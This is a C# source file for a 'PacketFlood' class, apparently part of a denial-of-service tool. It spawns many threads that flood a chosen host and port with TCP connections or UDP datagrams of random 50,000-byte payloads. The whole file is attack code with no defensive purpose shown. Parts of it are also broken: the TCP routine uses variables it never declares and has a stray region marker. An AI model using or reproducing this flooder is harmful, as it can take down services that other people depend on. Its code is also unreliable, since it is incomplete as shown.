using GAS.Core.Strings;
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
namespace GAS.Core
{
	public class PacketFlood : IAttacker
	{
		//public int Port,Protocol,Delay,FloodCount;
		#region SHIT
			int FloodCount;
			public bool Resp, AllowRandom, init = false;
			public string Data;
			private int Protocol;
			private Thread[] WorkingThreads;
			private static int BUFFER_SIZE = 50000;
		#endregion
		class DataS
		{
			public Socket s;

		}
		public PacketFlood(string ip, int port, int proto, int delay, bool resp, string data, bool random, int threadcount) {
			this.ThreadCount = threadcount;
			WorkingThreads = new Thread[ThreadCount];
			this.Target = Dns.GetHostAddresses(ip)[0].ToString();
			this.Port = port;
			this.Protocol = proto;
			this.Delay = delay;
			this.Resp = resp;
			this.Data = data;
			this.AllowRandom = random;
		}
		public override void Start() {
			IsFlooding = true;
			for ( int i = 0; i < ThreadCount; ( WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork)) ).Start(i++) ) ;
			init = true;
		}
		private void bw_DoWork(object sender) {
			while ( !init ) Thread.Sleep(100);
			try {
				//byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, ( AllowRandom ? Functions.RandomString() : null )));
				IPEndPoint RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(Target), Port);
				while ( IsFlooding ) {
					switch ( Protocol ) {
						case 1:
							try {
								TCPAttack(RHost);
							}
							catch { }
							break;
						case 2:
							try {
								UDPAttack(RHost);
							}
							catch { }
							break;
					}
				}
			}
			catch { }
		}
		public override void Stop() {
			IsFlooding = false;
		}
		//delay, timeout not supported
		private void TCPAttack(IPEndPoint trg) {
			Action refreshbuffer = () => {
				//fill buffer with random
				r.NextBytes(bytes);
				//set buffer as default send data
				Snd.SetBuffer(bytes, 0, bytes.Length);
			};
			#endregion

			//connect
			Conn = new SocketAsyncEventArgs() {
				DisconnectReuseSocket = true,
				RemoteEndPoint = trg,
				SocketFlags = SocketFlags.None,
				UserToken = s
			};
			//send handler data
			Snd = new SocketAsyncEventArgs() {
				DisconnectReuseSocket = true,
				SocketFlags = SocketFlags.None,
				UserToken = s
			};
			//sent handler
			SND = (a, b) => {
				try {
					//while attacking
					while ( this.IsFlooding ) {
						this.Requested++;
						//while connected send data
						while ( this.IsFlooding && b.SocketError == SocketError.Success && ( (Socket)a ).Connected ) {
							//generate data if needed
							if ( this.AllowRandom )
								refreshbuffer();
							if ( ( (Socket)a ).SendAsync(Snd) )
								return;
						}
						//if disconnected && attacking => create new socket
						if ( this.IsFlooding && !( (Socket)a ).Connected ) {
							s = createsocket();
							a = s;
							Conn.UserToken = s;
							Snd.UserToken = s;
							//try connect async
							//if async => exit function, CONNECTED will be invoked by event
							//else continue looping
							if ( ( (Socket)a ).ConnectAsync(Conn) )
								return;
						}
					}
				}
				catch { }
			};
			//connect handler
			CONNECTED = (a, b) => {
				try {
					//main attack event loop
					if ( this.IsFlooding ) {
						//while not connected
						while ( ( b.SocketError != SocketError.Success || !( (Socket)a ).Connected ) )
							//if async => exit function, SND will be invoked by event
							//else try to send data
							if ( this.IsFlooding )
								if ( ( (Socket)a ).ConnectAsync(Conn) )
									return;
						//try to send data async. 
						//if async => exit function, SND will be invoked by event
						//else invoke SND
						if ( this.IsFlooding )
							if ( !( (Socket)a ).SendAsync(Snd) )
								SND(a, Snd);
					}
				}
				catch { }
			};
			//attach handlers
			Snd.Completed += SND;
			Conn.Completed += CONNECTED;
			//if random generate shit else use data field
			if ( this.AllowRandom )
				refreshbuffer();
			else {
				var buf = System.Text.Encoding.ASCII.GetBytes(Data);
			}
			//make socket async
			s.Blocking = false;
			//connect
			if ( !s.ConnectAsync(Conn) )
				SND(s, Snd);
			//prevent GC, it's bug.
			Thread.Sleep(System.Threading.Timeout.Infinite);
		}
		//not tested
		private void UDPAttack(IPEndPoint trg) {
			#region Constructors
			Func<Socket> createsocket = () => new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
			Socket s = createsocket();
			Random r = new Random();
			SocketAsyncEventArgs Snd = null;
			byte[] bytes = new byte[BUFFER_SIZE];
			EventHandler<SocketAsyncEventArgs> SND = null;
			Action refreshbuffer = () => {
				//fill buffer with random
				r.NextBytes(bytes);
				//set buffer as default send data
				Snd.SetBuffer(bytes, 0, bytes.Length);
			};
			Action dropdashit =
				()=>{
					s.Dispose();
					bytes=null;
					r=null;
					SND=null;
					refreshbuffer=null;
					createsocket=null;
				};
			#endregion
			//send handler data
			Snd = new SocketAsyncEventArgs() {
				DisconnectReuseSocket = true,
				SocketFlags = SocketFlags.None,
				UserToken = s,
				RemoteEndPoint = trg
			};
			//sent handler
			SND = (a, b) => {
				try {
					//while attacking
					while ( this.IsFlooding ) {
						this.Requested++;
						//generate data if needed
						if ( this.AllowRandom )
							refreshbuffer();
						if ( ( (Socket)a ).SendToAsync(Snd) )
							return;
					}
				}
				catch { }
			};
			//attach handlers
			Snd.Completed += SND;
			//if random generate shit else use data field
			if ( this.AllowRandom )
				refreshbuffer();
			else {
				var buf = System.Text.Encoding.ASCII.GetBytes(Data);
			}
			//make socket async
			s.Blocking = false;
			//connect
			if ( !s.SendToAsync(Snd) )
				SND(s, Snd);
			//prevent GC, it's bug.
			Thread.Sleep(System.Threading.Timeout.Infinite);
		}
	}
}